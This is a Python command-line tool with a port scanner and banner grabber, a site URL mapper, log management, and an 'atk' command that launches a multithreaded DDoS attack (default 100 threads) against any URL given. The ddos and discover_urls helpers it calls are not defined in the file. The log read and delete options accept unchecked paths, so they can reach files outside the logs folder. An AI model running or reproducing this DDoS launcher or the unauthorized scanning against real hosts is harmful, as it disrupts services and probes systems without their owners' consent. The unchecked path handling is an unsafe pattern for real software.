import click
import socket
import threading
import json
import os
import shutil
from rich import print as rprint
from rich.console import Console
import click_completion
import logging
from urllib.parse import urlparse
from src.utils.function import grab_banner


click_completion.init()

console = Console()


@click.command("scan")
@click.argument("url", type=click.STRING)
@click.option("-wl", type=click.STRING, help="Use to name the file where the result is saved.")
def scan(url, wl=None):
    try:
        ip_address = socket.gethostbyname(url)
        rprint(f'Scanning ports for [bold]{url}[/bold] ([cyan]{ip_address}[/cyan])...')
        open_ports = []

        for port in range(1, 1001):  # Scan ports 1 to 1000
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.1)  # Set a timeout for connection attempt
                result = sock.connect_ex((ip_address, port))
                if result == 0:
                    open_ports.append(port)
                    service = grab_banner(ip_address, port)
                    rprint(f'[green]Port {port}[/green] is open ({service})')

        if not open_ports:
            rprint('[bold yellow]No open ports found.[/bold yellow]')
        else:
            logname = f"logs/scan_{wl or url}.json"
            logging.basicConfig(
                filename=logname,
                filemode='a',
                format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
                datefmt='%H:%M:%S',
                level=logging.INFO
            )
            logging.info(f"open ports: {open_ports}")
            rprint('[bold]Open ports:[/bold]', open_ports)

    except socket.gaierror:
        rprint('[bold red]Hostname could not be resolved. Please enter a valid hostname.[/bold red]')
    except socket.error as e:
        rprint('[bold red]Could not connect to server.[/bold red]')
        rprint(f'[italic red]{e}[/italic red]')

@click.command("atk")
@click.argument("url", type=click.STRING)
@click.option("--method",
              "-m",
               type=click.Choice(["GET", "POST", "PUT"]),
               help="The HTTP method used in the targeted url (GET, PUT, POST)"
)
@click.option(
    "-p",
    "--payload",
    help="The request payload (JSON string or dictionary)",
)
@click.option("--threads", 
              "-t", 
              default=100, 
              help="Number of threads for DDoS attack"
)
def attack(url, method, payload, threads):
    rprint(
        f'Initiating DDoS attack on [bold]{url}[/bold] with [green]{method} method[/green] and [cyan]{threads}[/cyan] threads...')
    headers = {"Content-Type": "application/json"}  # Set default for JSON

    # Try converting payload to a dictionary if it's a JSON string
    try:
        # Check if payload is not None before conversion
        if payload is not None:
            payload = json.loads(payload)
    except json.JSONDecodeError:
        pass
    for _ in range(threads):
        thread = threading.Thread(target=ddos, args=(method, url, payload, headers))
        thread.start()


@click.command()
def version():
    rprint(f"[bold blue]version 0.3.0[/bold blue]")


@click.command()
@click.argument("url", type=click.STRING)
@click.option("-wl", type=click.STRING, help="Use to name the file where the result is saved.")
def map(url, wl):
    # Step 1: Discover URLs on the website
    parsed_url = urlparse(url)
    domain = parsed_url.netloc
    discovered_urls = discover_urls(url)
    if wl is not None:
        logname = f"logs/map_{wl}.json"
        logging.basicConfig(filename=logname,
                            filemode='a',
                            format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
                            datefmt='%H:%M:%S',
                            level=logging.INFO)
        logging.info(discovered_urls)
    else:
        logname = f"logs/map_{domain}.json"
        logging.basicConfig(filename=logname,
                            filemode='a',
                            format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
                            datefmt='%H:%M:%S',
                            level=logging.INFO)
        logging.info(discovered_urls)
    rprint(
        f"[bold cyan]Discovered {len(discovered_urls)} URLs on {url}:[/bold cyan]\n")
    for i, discovered_url in enumerate(discovered_urls, start=1):
        rprint(f"[bold green]{i}. {discovered_url}[/bold green]")


@click.command()
@click.option(
    "-ls",
    "--list",
    type=click.Choice(["scan", "map"]),
    help="List all the logs of scanned or mapped URL."
)
@click.option(
    "-r",
    "--read",
    type=click.STRING,
    help="Read the logs content."
)
@click.option(
    "-rm",
    "--remove",
    type=click.STRING,
    help="Remove a single or all log files."
)
def logs(list, read, remove):
    if list is not None:
        file_names = [f for f in os.listdir('logs') if os.path.isfile(os.path.join('logs', f)) and f.startswith(f'{list}_')]
        rprint(f"[bold green]List of all {list} logs:[/bold green]")
        rprint(f"[white]{file_names}[/white]")

    if read is not None:
        with open(f'logs/{read}', 'r') as file:
            content = file.read()
        rprint(f"[white]{content}[/white]")


    if remove is not None:
        if remove == 'all':
            for filename in os.listdir('logs'):
                file_path = os.path.join('logs', filename)
                try:
                    if os.path.isfile(file_path) or os.path.islink(file_path):
                        os.unlink(file_path)  # Remove file or link

                    rprint(f"[green bold]{filename} have been deleted[/green bold]")
                except Exception as e:
                    rprint(f"[red bold]Failed to delete {filename}. Reason: {e}[/red bold]")
        else:
            file_path = os.path.join('logs', remove)
            if os.path.exists(file_path):  # Use os.path.exists to check existence of file/link/dir
                try:
                    if os.path.isfile(file_path) or os.path.islink(file_path):
                        os.unlink(file_path)
                        rprint(f"[green bold]{remove} has been deleted.[/green bold]")
                    elif os.path.isdir(file_path):
                        shutil.rmtree(file_path)
                        rprint(f"[green bold]Directory {remove} has been deleted.[/green bold]")
                    else:
                        rprint(f"[bold red]Failed to delete {remove}, Reason: unknown type.[/bold red]")
                except Exception as e:
                    rprint(f"[bold red]Failed to delete {remove}, Reason: {e}.[/bold red]")
            else:
                rprint(f"[bold red]File or directory {remove} not found.[/bold red]")
